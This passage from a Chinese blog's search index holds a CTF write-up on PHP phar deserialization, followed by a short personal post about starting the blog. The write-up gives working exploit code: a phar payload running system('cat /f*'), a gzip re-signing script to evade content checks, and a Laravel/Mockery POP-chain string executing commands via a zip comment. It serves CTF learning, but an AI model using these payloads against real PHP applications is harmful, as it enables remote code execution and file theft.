SWPU]1zweb</h2><p>可以非预期，我们这里按预期解来讲</p><p><img src="/2023/08/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230817071725768.png" alt="image-20230817071725768"></p><p><code>index.php</code>  源代码中查看完整代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoveNss</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ljt</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dky</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;ljt=<span class="hljs-string">&quot;ljt&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;dky=<span class="hljs-string">&quot;dky&quot;</span>;<br>        <span class="hljs-title function_ invoke__">phpinfo</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;ljt===<span class="hljs-string">&quot;Misc&quot;</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;dky===<span class="hljs-string">&quot;Re&quot;</span>)<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;ljt=<span class="hljs-string">&quot;Re&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;dky=<span class="hljs-string">&quot;Misc&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>upload.php </code>源代码中查看完整代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>] &gt; <span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;上传异常&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$allowedExts</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>, <span class="hljs-string">&quot;jpeg&quot;</span>, <span class="hljs-string">&quot;jpg&quot;</span>, <span class="hljs-string">&quot;png&quot;</span>);<br>    <span class="hljs-variable">$temp</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);<br>    <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">end</span>(<span class="hljs-variable">$temp</span>);<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;size&quot;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$extension</span>, <span class="hljs-variable">$allowedExts</span>)))&#123;<br>        <span class="hljs-variable">$content</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]);<br>        <span class="hljs-variable">$pos</span> = <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$content</span>, <span class="hljs-string">&quot;__HALT_COMPILER();&quot;</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">gettype</span>(<span class="hljs-variable">$pos</span>)===<span class="hljs-string">&quot;integer&quot;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ltj一眼就发现了phar&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&quot;./upload/&quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]))&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>] . <span class="hljs-string">&quot; 文件已经存在&quot;</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;./upload/&quot;</span>.<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>], <span class="hljs-string">&quot;w&quot;</span>);<br>                <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>, <span class="hljs-variable">$content</span>);<br>                <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;上传成功 ./upload/&quot;</span>.<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>            &#125;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;dky不喜欢这个文件 .&quot;</span>.<span class="hljs-variable">$extension</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p><code>upload.php</code>检查上传文件的后缀，检查文件内容，检查文件是否存在</p><p><code>index.php</code>绕过<code>__wakeup</code>即可</p><h3 id="对phar文件的处理"><a href="#对phar文件的处理" class="headerlink" title="对phar文件的处理"></a>对phar文件的处理</h3><ul><li>修改后缀      <code>a.phar -&gt; a.png</code></li><li>使用gzip对文件进行压缩，从而绕过对<code>__HALT_COMPILER();</code>的检查</li><li>php&#x2F;5.5.38 绕过<code>__wakeup</code> 修改类数字大于成员个数</li></ul><h3 id="实际操作"><a href="#实际操作" class="headerlink" title="实际操作"></a>实际操作</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoveNss</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ljt</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dky</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;ljt=<span class="hljs-string">&quot;Misc&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;dky=<span class="hljs-string">&quot;Re&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;ljt===<span class="hljs-string">&quot;Misc&quot;</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;dky===<span class="hljs-string">&quot;Re&quot;</span>)<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LoveNss</span>();<br><span class="hljs-variable">$a</span>-&gt;cmd = <span class="hljs-string">&#x27;system(&quot;cat /f*&quot;);&#x27;</span>;<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;a.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;GIF89a&quot;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test1.txt&quot;</span>, <span class="hljs-string">&quot;test1&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>$a-&gt;cmd = &#39;system(&quot;cat /f*&quot;);&#39;;</code>记得加<code>;</code>号</p><p>修改后缀    <code>a.phar-&gt;a.png</code></p><p>修改个数</p><p><img src="/2023/08/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/b5d0c4afd2.jpg" alt="NSSIMAGE"></p><p>改完后重新签名并进行压缩</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">from</span> hashlib import sha1<br>import gzip<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;phar.png&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-built_in">file</span>:<br>    f = <span class="hljs-built_in">file</span>.<span class="hljs-built_in">read</span>()<br>s = f[:<span class="hljs-number">-28</span>]  <span class="hljs-comment"># 获取要签名的数据</span><br>h = f[<span class="hljs-number">-8</span>:]  <span class="hljs-comment"># 获取签名类型以及GBMB标识</span><br>new_file = s + sha1(s).digest() + h  <span class="hljs-comment"># 数据 + 签名 + (类型 + GBMB)</span><br>f_gzip = gzip.GzipFile(<span class="hljs-string">&quot;1.png&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>)<br>f_gzip.<span class="hljs-built_in">write</span>(new_file)<br>f_gzip.<span class="hljs-built_in">close</span>()<br></code></pre></td></tr></table></figure><p>然后上传文件</p><p><img src="/2023/08/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230817073309229.png" alt="image-20230817073309229"></p><p><img src="/2023/08/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230817073336340.png" alt="image-20230817073336340"></p><p><img src="/2023/08/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230817073419227.png" alt="image-20230817073419227"></p><h2 id="小说一下绕过-HALT-COMPILER-的检查"><a href="#小说一下绕过-HALT-COMPILER-的检查" class="headerlink" title="小说一下绕过__HALT_COMPILER();?&gt;的检查"></a>小说一下绕过__HALT_COMPILER();?&gt;的检查</h2><p>1.将phar文件进行gzip压缩后在修改为png文件后缀</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha1<br><span class="hljs-keyword">import</span> gzip<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;phar.png&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    f = file.read()<br>s = f[:-<span class="hljs-number">28</span>]  <span class="hljs-comment"># 获取要签名的数据</span><br>h = f[-<span class="hljs-number">8</span>:]  <span class="hljs-comment"># 获取签名类型以及GBMB标识</span><br>new_file = s + sha1(s).digest() + h  <span class="hljs-comment"># 数据 + 签名 + (类型 + GBMB)</span><br>f_gzip = gzip.GzipFile(<span class="hljs-string">&quot;1.png&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>)<br>f_gzip.write(new_file)<br>f_gzip.close()<br></code></pre></td></tr></table></figure><hr><p>2.将phar的内容写进压缩包注释中，然后压缩为zip也会绕过该正则</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$phar_file</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$exp</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$phar_file</span>;<br>    <span class="hljs-variable">$zip</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipArchive</span>();<br>    <span class="hljs-variable">$res</span> = <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">&#x27;1.zip&#x27;</span>,<span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">CREATE</span>); <br>    <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&#x27;crispr.txt&#x27;</span>, <span class="hljs-string">&#x27;file content goes here&#x27;</span>);<br>    <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">setArchiveComment</span>(<span class="hljs-variable">$phar_file</span>);<br>    <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$phar_file</span> = <span class="hljs-string">&#x27;O:40:&quot;Illuminate\Broadcasting\PendingBroadcast&quot;:2:&#123;S:6:&quot;events&quot;;O:25:&quot;Illuminate\Bus\Dispatcher&quot;:1:&#123;S:13:&quot;queueResolver&quot;;a:2:&#123;i:0;O:25:&quot;Mockery\Loader\EvalLoader&quot;:0:&#123;&#125;i:1;S:4:&quot;load&quot;;&#125;&#125;S:5:&quot;event&quot;;O:38:&quot;Illuminate\Broadcasting\BroadcastEvent&quot;:1:&#123;S:10:&quot;connection&quot;;O:32:&quot;Mockery\Generator\MockDefinition&quot;:2:&#123;S:6:&quot;config&quot;;O:35:&quot;Mockery\Generator\MockConfiguration&quot;:1:&#123;S:4:&quot;name&quot;;S:6:&quot;crispr&quot;;&#125;S:4:&quot;code&quot;;S:31:&quot;\3c\3f\70\68\70 echo system(&quot;cat /flag&quot;);&quot;;&#125;&#125;&#125;&#x27;</span>;<br><br>    <span class="hljs-variable">$zip</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipArchive</span>();<br>    <span class="hljs-variable">$res</span> = <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">&#x27;1.zip&#x27;</span>,<span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">CREATE</span>); <br>    <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&#x27;crispr.txt&#x27;</span>, <span class="hljs-string">&#x27;file content goes here&#x27;</span>);<br>    <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">setArchiveComment</span>(<span class="hljs-variable">$phar_file</span>);<br>    <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br></code></pre></td></tr></table></figure><h2 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h2><p>唉，啥都不会，自己还懒</p><p>这篇发完后又得过一段时间才能写下一篇了</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>新征程</title>
    <link href="/2023/07/31/%E6%96%B0%E5%BE%81%E7%A8%8B/"/>
    <url>/2023/07/31/%E6%96%B0%E5%BE%81%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="新起点，勇往直前"><a href="#新起点，勇往直前" class="headerlink" title="新起点，勇往直前"></a>新起点，勇往直前</h2><p>从搭建好自己的博客开始，作为新起点，记录自己的刷题</p><p>本来是不喜欢写文章的，但发现要记录的有很多，便开始搭博客</p><p>要比过去认真刷题，遇到题目多做，不要只看别人WP就认为自己会了，我可是深受其害。</p><p>就这样吧<img src="/%E6%96%B0%E5%BE%81%E7%A8%8B/fluid.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
